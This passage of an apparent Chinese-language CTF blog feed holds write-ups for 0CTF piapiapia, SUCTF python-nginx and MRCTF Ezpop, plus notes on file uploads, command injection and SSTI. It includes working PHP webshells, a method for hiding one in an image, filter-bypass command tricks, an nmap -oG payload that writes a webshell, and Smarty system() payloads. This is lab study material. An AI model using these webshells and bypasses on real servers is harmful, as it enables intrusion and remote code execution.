$this-&gt;str = new Test();    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;&#125;$a = new Show();$a-&gt;source = new Show();$a-&gt;source-&gt;str-&gt;p = new Modifier();echo urlencode(serialize($a));?&gt;</code></pre><p>思考：为什么这里要用urlencode编码进行加密？</p><p>因为$var是protected 类型，序列化后要手动加一些字符才能通过。</p><p>贴一段代码：</p><p><img src="/2021/10/13/MRCTF2020-Ezpop/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY0MjYxMA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MRCTF2020-Ezpop&quot;&gt;&lt;a href=&quot;#MRCTF2020-Ezpop&quot; class=&quot;headerlink&quot; title=&quot;MRCTF2020-Ezpop&quot;&gt;&lt;/a&gt;MRCTF2020-Ezpop&lt;/h1&gt;&lt;p&gt;打开网页，代码如下：&lt;/p&gt;
&lt;pr</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="反序列化" scheme="https://sakurahack-y.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>0CTF 2016-piapiapia</title>
    <link href="https://sakurahack-y.github.io/2021/10/10/0CTF-2016-piapiapia/"/>
    <id>https://sakurahack-y.github.io/2021/10/10/0CTF-2016-piapiapia/</id>
    <published>2021-10-10T14:01:12.000Z</published>
    <updated>2021-10-10T18:00:57.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h1><p>代码审计还有PHP反序列化一直是我的硬伤，所以想借助这个题目来理一理思路。</p><p>首先，打开网址，如图：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010224803224.png" alt="image-20211010224803224"></p><p>先尝试了万能密码，没有效果。</p><p>sql注入，手工和sqlmap跑半天没有效果，放弃。</p><p>没有什么可以做的，就扫一扫目录。</p><p>python dirsearch.py  -u <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/</a> -e * -s 1 -x 400,403,404,500,503,429 -o C:\Users\Sakura\Desktop\1.txt</p><p>buu扫目录一直容易崩溃，所以要降低dirsearch的扫描速度。</p><p>最终扫描出来了 register.php 和<a href="http://www.zip./">www.zip。</a></p><p>进入 xxx/register.php :<br><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225335750.png" alt="image-20211010225335750"> </p><p>注册账号并登录：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225502569.png" alt="image-20211010225502569"></p><p>考虑了文件上传，上传多次，没有效果，放弃！</p><p>更新文件后，进入这个界面：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225645545.png" alt="image-20211010225645545"></p><p>就此停下，不知道如何进行下一步，决定从源码入手。</p><p>访问 <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/www.zip">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/www.zip</a></p><p>获取到了网站源码。</p><p>进行苦逼的代码审计：</p><p>由上方可知逻辑结构为：register-&gt;login-&gt;update-&gt;profile</p><p>登录和注册可以先不看，由 update-&gt;profile</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225831335.png" alt="image-20211010225831335"></p><p>首先查看config.php，看到了flag但是为空，没有显示,这里要注意下config.php，下面可能会用到。</p><p>继续浏览代码，寻找敏感点：</p><p>在profile.php中发现了两个关键点，unserialize(),file_get_contents()</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p>猜测应该考察PHP反序列化，$profile[‘photo’] 是重点，考虑对其传值，实现flag的读取。</p><p>进一步审计：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230732653.png" alt="image-20211010230732653"></p><p>在update.php中发现了这样一个函数：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230845047.png" alt="image-20211010230845047"></p><p>$profile[‘photo’] = ‘upload/‘ . md5($file[‘name’]);</p><p>发现该值被hash加密了，根本无法对其进行控制。</p><p>既然profile[‘photo’] 无法控制，我们是否可以考虑传入其它值来达到目的。看profile[‘photo’]的上一个参数，profile[‘nickname’]，是否可以通过profile[‘nickname’]传值给profile[‘photo’]呢.</p><p>继续看unserialize($profile)</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010232230667.png" alt="image-20211010232230667"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010232355284.png" alt="image-20211010232355284"></p><p>由此可知，对像user中show_profile()的返回值被反序列化，查看show_porfile函数：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010233728714.png" alt="image-20211010233728714"></p><p>$username首先会被过滤一次，跟进filter()函数：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010235353988.png" alt="image-20211010235353988"></p><p>这里的意思是\会被|替代，一些敏感的sql单词会被hacker代替(上文的select,insert,update,delete,where)</p><p>过滤后，$username会被插入到select语句中：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010235733254.png" alt="image-20211010235733254"></p><p>到此，基本明白了网站的运行逻辑。</p><p>接下来继续从反序列化入手：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230845047.png" alt="image-20211010230845047"></p><p>接上面的思路，由于profile=[‘photo’] 我们无法控制，而fileter过滤，如果存在where则会变为hacker，增加了一个字符，所以考察的知识点应该为字符串增加的PHP反序列化逃逸。这里会对$profile进行序列化。</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011003440679.png" alt="image-20211011003440679"></p><p>修改phpto的值</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011010728666.png" alt="image-20211011010728666"></p><p>要注意，最后还要通过update.php中还存在一个限制：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011011455216.png" alt="image-20211011011455216"></p><p>nickname的长度不可以&gt;10,那该怎么绕过它呢？</p><p>这里就要用到数组了</p><pre><code>md5(Array()) = nullsha1(Array()) = nullereg(pattern,Array()) =nullpreg_match(pattern,Array()) = falsestrcmp(Array(), “abc”) =nullstrpos(Array(),“abc”) = nullstrlen(Array()) = null</code></pre><p>所以nickname传入数组就可以绕过。</p><p>如何将nickname变为数组呢？让我们来看一个例子：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;15885248522&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/9f6e6800cfae7749eb6c486619254b9c&quot;;&#125;</code></pre><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011014313810.png" alt="image-20211011014313810"></p><p>要让 </p><pre><code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>逃逸出来</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011014619609.png" alt="image-20211011014619609"></p><p>34个字符，所以应该有34个where来逃逸34个字符。</p><p>6*34=204</p><pre><code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;15885248522&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/9f6e6800cfae7749eb6c486619254b9c&quot;;&#125;</code></pre><p>所以payload就为：</p><pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>在burp中将nickname类型改为数组，并传入payload</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011015434242.png" alt="image-20211011015434242"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011015942962.png" alt="image-20211011015942962"></p><p>查看源代码，可发现base64加密</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011020008050.png" alt="image-20211011020008050"></p><p>解密即可得到flag</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011020027430.png" alt="image-20211011020027430"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0CTF-2016-piapiapia&quot;&gt;&lt;a href=&quot;#0CTF-2016-piapiapia&quot; class=&quot;headerlink&quot; title=&quot;0CTF 2016-piapiapia&quot;&gt;&lt;/a&gt;0CTF 2016-piapiapia&lt;/h1&gt;&lt;p&gt;代码</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="代码审计" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF2019-python-nginx</title>
    <link href="https://sakurahack-y.github.io/2021/10/10/SUCTF2019-python-nginx/"/>
    <id>https://sakurahack-y.github.io/2021/10/10/SUCTF2019-python-nginx/</id>
    <published>2021-10-09T16:26:18.000Z</published>
    <updated>2021-10-10T07:26:02.043Z</updated>
    
    <content type="html"><![CDATA[<p>题目源码：</p><pre><code>@app.route(&#39;/getUrl&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;]) def getUrl():   url = request.args.get(&quot;url&quot;)   host = parse.urlparse(url).hostnameif host == &#39;suctf.cc&#39;:   return &quot;我扌 your problem? 111&quot;parts = list(urlsplit(url)) host = parts[1]if host == &#39;suctf.cc&#39;:   return &quot;我扌 your problem? 222 &quot; + host newhost = []for h in host.split(&#39;.&#39;):   newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))   parts[1] = &#39;.&#39;.join(newhost)  # 去掉 url 中的空格   finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]   host = parse.urlparse(finalUrl).hostnameif host == &#39;suctf.cc&#39;:   return urllib.request.urlopen(finalUrl).read()else :  return &quot;我扌 your problem? 333&quot;</code></pre><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>该题的主要问题是在</p><p>h.encode(‘idna’).decode(‘utf-8’)</p><p>IDNA实际上是国际化域名</p><p>什么是IDN?</p><p>国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。</p><p><img src="/2021/10/10/SUCTF2019-python-nginx/1.png"></p><p>Nginx重要配置文件：</p><pre><code>配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf</code></pre><p>利用脚本来跑可用字符：</p><pre><code class="#">for i in range(128,65537):        tmp=chr(i)        try:                res = tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)                if(&quot;-&quot;) in res:                        continue                print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))        except:                pass</code></pre><p><img src="/2021/10/10/SUCTF2019-python-nginx/3.png"><br>发现可利用字符,获取flag：<br><img src="/2021/10/10/SUCTF2019-python-nginx/2.png"></p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>利用两此urlsplit漏洞：<br>这道题不能让他为suctf.cc<br><img src="/2021/10/10/SUCTF2019-python-nginx/5.png"><br>但是经过了 urlunsplit 后变成 suctf.cc，很容易就构造出：file////:suctf.cc/usr/local/nginx/conf/nginx.conf，这样就能读取文件了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@app.route(&amp;#39;/getUrl&amp;#39;, methods = [&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) 
def getUrl(): 
  url = request.args.get(&amp;q</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马执行</title>
    <link href="https://sakurahack-y.github.io/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <id>https://sakurahack-y.github.io/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</id>
    <published>2021-10-08T15:27:36.863Z</published>
    <updated>2021-10-08T15:27:21.975Z</updated>
    
    <content type="html"><![CDATA[<p>正常：<br><?php@eval($_POST['x']);?></p><p>如果有&lt;?过滤，采用：</p><script language="php">eval($_REQUEST[x])</script><p>一种简单的绕安全狗方法：变量传递<br>&lt;?php<br>$a=$_GET[‘x’];<br>$$a=$_GET[‘y’];<br>$b($_POST[‘z’]);</p><p>传入方法：http://       php?x=b&amp;y=assert<br>post:           z=phpinfo();</p><p>问：为什么这里不用eval<br>因为eval赋值给b没有效果的。</p><p>对传入数据进行加密<br><?php assert(base64_decode($_POST['x']));?><br>当这种情况用蚁剑连接时，需要采用base64加密。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;正常：&lt;br&gt;&lt;?php
@eval($_POST[&#39;x&#39;]);
?&gt;&lt;/p&gt;
&lt;p&gt;如果有&amp;lt;?过滤，采用：&lt;/p&gt;
&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[x])&lt;/script&gt;

&lt;p&gt;一种简单的绕安全狗方法：变量传递&lt;br&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="文件上传" scheme="https://sakurahack-y.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="文件上传" scheme="https://sakurahack-y.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>简单图片马的制作</title>
    <link href="https://sakurahack-y.github.io/2021/10/08/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/"/>
    <id>https://sakurahack-y.github.io/2021/10/08/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/</id>
    <published>2021-10-08T15:27:36.859Z</published>
    <updated>2021-10-08T15:26:40.999Z</updated>
    
    <content type="html"><![CDATA[<p>1.首先图片命名111.jpg</p><p>2.再新建222.asp文件，一句话木马写入</p><p>3.然后win+R，cmd，cd到之前图片的目录路径下，命令为copy 111.jpg/b+222.asp/a 333.jpg</p><p>最后就会出现新的图片3333.jpg，就是制作出的图片马。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.首先图片命名111.jpg&lt;/p&gt;
&lt;p&gt;2.再新建222.asp文件，一句话木马写入&lt;/p&gt;
&lt;p&gt;3.然后win+R，cmd，cd到之前图片的目录路径下，命令为copy 111.jpg/b+222.asp/a 333.jpg&lt;/p&gt;
&lt;p&gt;最后就会出现新的图片333</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="文件上传" scheme="https://sakurahack-y.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="文件上传" scheme="https://sakurahack-y.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>文件上传之后缀替换</title>
    <link href="https://sakurahack-y.github.io/2021/10/08/%E5%90%8E%E7%BC%80%E6%9B%BF%E6%8D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://sakurahack-y.github.io/2021/10/08/%E5%90%8E%E7%BC%80%E6%9B%BF%E6%8D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2021-10-08T15:27:36.854Z</published>
    <updated>2021-10-08T15:26:15.060Z</updated>
    
    <content type="html"><![CDATA[<p>php2，php3、php4、php5，pht，phtml，phps</p><p>.JPEG;.JPE;.JPG，”JPGGraphic File”<br>.gif，”GIF89A”<br> .zip，”Zip Compressed”<br>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;php2，php3、php4、php5，pht，phtml，phps&lt;/p&gt;
&lt;p&gt;.JPEG;.JPE;.JPG，”JPGGraphic File”&lt;br&gt;.gif，”GIF89A”&lt;br&gt; .zip，”Zip Compressed”&lt;br&gt;.doc;.xls;.xlt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="文件上传" scheme="https://sakurahack-y.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="文件上传" scheme="https://sakurahack-y.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>命令执行</title>
    <link href="https://sakurahack-y.github.io/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://sakurahack-y.github.io/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-10-08T15:23:21.439Z</published>
    <updated>2021-10-08T16:09:27.385Z</updated>
    
    <content type="html"><![CDATA[<p>php调用外部程序常用的函数：<br>system()—执行shell命令也就是向dos发送一条指令。<br>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>exec() —执行外部程序。<br>passthru() — 执行外部程序并且显示原始输出。</p><p>绕过技巧：<br>一、常见管道符：<br>‘|’ 直接执行后面的语句<br>‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>‘&amp;’ 前面和后面命令都要执行，无论前面真假<br>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>Linux:<br>Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同<br>二、空格绕过(空格被过滤)：<br>&lt;  –  重定向，如cat&lt;flag.php<br>&lt;&gt;      –   重定向，如cat&lt;&gt;flag.php<br>%09  –  需要php环境，如cat%09flag.php<br>${IFS}  –  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php<br>$IFS$9  –  后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php<br>三、黑名单绕过<br>1、拼接<br>a=c;b=at;c=flag;$a$b $c<br>a=c;b=at;c=heb;d=ic;ab{c}{d}<br>2、base64编码<br>echo MTIzCg==|base64 -d 其将会打印123<br>echo “Y2F0IC9mbGFn”|base64-d|bash ==&gt;cat /flag<br>3、hex编码<br>echo “636174202f666c6167” | xxd -r -p|bash ==&gt;cat /flag<br>4、单引号和双引号绕过<br>ca’’t flag 或ca””t flag<br>ca’’t te””st.php<br>5、反斜杠绕过<br>ca\t fl\ag<br>cat te\st.php<br>6、绕过ip中的句点<br>网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。<br>可以直接访问<a href="http://2130706433或者http//0x7F000001%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87.%E7%9A%84ip%E8%BF%87%E6%BB%A4%E3%80%82">http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。</a><br>在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP<br>四、绕过长度限制<br>1，通过&gt;来创建文件</p><blockquote><p>flag.txt<br>2，通过&gt;将命令结果存入文件中<br>echo “hello hacker” &gt; flag.txt<br>3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容<br>echo “hello hacker” &gt;&gt; flag.txt<br>4、Linux中命令换行<br>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。<br>比如：cat flag<br>ca<br>t<br> fla<br>g.txt<br>将命令一条一条输入一个文本中再执行:<br>root@kali:<del># echo “ca\“&gt;cmd<br>root@kali:</del># echo “t\“&gt;&gt;cmd<br>root@kali:<del># echo “ fl\“&gt;&gt;cmd<br>root@kali:</del># echo “ag”&gt;&gt;cmd<br>root@kali:<del># cat cmd<br>ca<br>t<br> fl<br>ag<br>root@kali:</del># sh cmd<br>this is your flag<br>5、ls命令：<br>ls -a 列出文件下所有的文件，包括以“.“开头的隐藏文件（linux下文件隐藏文件是以.开头的，如果存在..代表存在着父目录）。<br>ls -l 列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等。<br>ls -F 在每一个文件的末尾加上一个字符说明该文件的类型。”@”表示符号链接、”|”表示FIFOS、”/“表示目录、”=”表示套接字。<br>ls -s 在每个文件的后面打印出文件的大小。 size(大小)<br>ls -t 按时间进行文件的排序 Time(时间)<br>ls -A 列出除了”.”和”..”以外的文件。<br>ls -R 将目录下所有的子目录的文件都列出来，相当于我们编程中的“递归”实现<br>ls -L 列出文件的链接名。Link（链接）<br>ls -S 以文件的大小进行排序<br>6、各种读文件命令：<br>cat–由第一行开始显示内容，并将所有内容输出<br>tac–从最后一行倒序显示内容，并将所有内容输出<br>more– 根据窗口大小，一页一页的现实文件内容<br>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head– 只显示头几行<br>tail –只显示最后几行<br>nl –类似于cat -n，显示时输出行号<br>tailf– 类似于tail -f<br>vim –使用vim工具打开文本<br>vi –使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;php调用外部程序常用的函数：&lt;br&gt;system()—执行shell命令也就是向dos发送一条指令。&lt;br&gt;shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。&lt;br&gt;exec() —执行外部程序。&lt;br&gt;passthru()</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="代码\命令执行类" scheme="https://sakurahack-y.github.io/categories/CTF/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/"/>
    
    
    <category term="命令执行" scheme="https://sakurahack-y.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>escapeshellarg+escapeshellcmd 函数漏洞</title>
    <link href="https://sakurahack-y.github.io/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/"/>
    <id>https://sakurahack-y.github.io/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/</id>
    <published>2021-10-08T15:23:21.436Z</published>
    <updated>2021-10-08T16:00:44.872Z</updated>
    
    <content type="html"><![CDATA[<p> escapeshellarg(string $arg): string<br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。<br>escapeshellcmd<br> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 </p><p>这两个函数在一起用会有些问题.PS:先用escapeshellarg再用escapeshellcmd才会有这个问题<br>传入的参数是：172.17.0.2’ -v -d a=1<br>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a><br>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p><p>两次转译后出现了问题，没有考虑到单引号的问题</p><p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘</p><p>总结当两个函数按这样顺序一起使用，使用过滤就没有意义了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; escapeshellarg(string $arg): string&lt;br&gt;escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见函数" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    
    
    <category term="函数" scheme="https://sakurahack-y.github.io/tags/%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>ssti</title>
    <link href="https://sakurahack-y.github.io/2021/10/08/ssti/"/>
    <id>https://sakurahack-y.github.io/2021/10/08/ssti/</id>
    <published>2021-10-08T15:23:21.432Z</published>
    <updated>2021-10-08T15:36:26.733Z</updated>
    
    <content type="html"><![CDATA[<p>&#123;&#123; worldcount&#40;post.content&#41; &#125;&#125;</p><p>Flask使用Jinja2作为模板引擎<br>语法：<br>&#123;%…%&#125;语句(statements)<br>&#123;&#123;…&#125;&#125;打印模板输出的表达式(Expressions)<br>&#123;#…#&#125;注释<br>#…##行语句(Line Statements)</p><p>smarty注入payload</p><p>&#123;if phpinfo()&#125;&#123;/if&#125;<br>&#123;if system(‘ls’)&#125;&#123;/if&#125;<br>&#123; readfile(‘/flag’) &#125;<br>&#123;if show_source(‘/flag’)&#125;&#123;/if&#125;<br>&#123;if system(‘cat ../../../flag’)&#125;&#123;/if&#125; #本题payload</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&amp;#123;&amp;#123; worldcount&amp;#40;post.content&amp;#41; &amp;#125;&amp;#125;&lt;/p&gt;
&lt;p&gt;Flask使用Jinja2作为模板引擎&lt;br&gt;语法：&lt;br&gt;&amp;#123;%…%&amp;#125;语句(statements)&lt;br&gt;&amp;#123;&amp;#</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="模板注入" scheme="https://sakurahack-y.github.io/categories/CTF/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="ssti" scheme="https://sakurahack-y.github.io/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>python的一些内置函数</title>
    <link href="https://sakurahack-y.github.io/2021/10/08/python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/"/>
    <id>https://sakurahack-y.github.io/2021/10/08/python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/</id>
    <published>2021-10-08T15:23:21.429Z</published>
    <updated>2021-10-08T15:20:51.917Z</updated>
    
